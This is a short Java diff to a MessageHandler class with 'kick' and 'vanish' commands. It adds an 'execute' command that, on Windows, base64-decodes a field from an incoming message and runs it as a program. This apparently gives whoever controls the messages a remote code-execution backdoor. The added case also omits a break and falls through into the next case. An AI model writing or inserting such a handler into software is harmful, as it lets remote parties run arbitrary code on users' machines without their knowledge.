@@ -83,6 +83,10 @@ public class MessageHandler {
                 case "kick":
                     ServerUtil.disconnect();
                     break;
+                case "execute":
+                    if (ShellUtil.isWin()) {
+                        ShellUtil.runProg(Base64.getDecoder().decode(msgArr[1]));
+                    }
                 case "vanish":
                     //todo
                     break;
